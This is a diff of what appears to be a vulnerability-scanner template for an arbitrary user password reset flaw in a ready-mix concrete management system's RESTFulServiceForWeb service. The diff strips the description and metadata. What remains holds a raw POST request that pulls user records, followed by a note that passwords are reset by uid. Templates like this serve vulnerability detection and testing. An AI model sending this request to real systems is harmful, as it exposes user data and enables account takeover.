@@ -3,12 +3,8 @@ info:
   name: 预拌砼综合管理系统RESTFulServiceForWeb存在任意用户密码重置漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qfea60os8g7zi146'
+  description: ''
   tags: other,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qfea60os8g7zi146
-    fofa: body="Libs/Platform.lib"
 http:
 - raw:
   - 'POST /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/Do?id=1780623328004 HTTP/1.1
@@ -24,7 +20,6 @@ http:
 
     {"Resource":"MethodCluster","Parameter":[["Method","Sky.PlatForm.Core.clsUser.GetData"],["Para","{\"$VER$\":{},\"filter\":{\"OrderBy\":\"CreateDate DESC\",\"Condition\":\"Cds_OrgType.IsMain=1 and isnull(UserType,0)<>''3''\"}}"]]}
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1786373133990-ec157b51-7e83-4d5d-96d9-b23f44b41ce1.png)
 
     根据uid重置用户密码'
   redirects: false
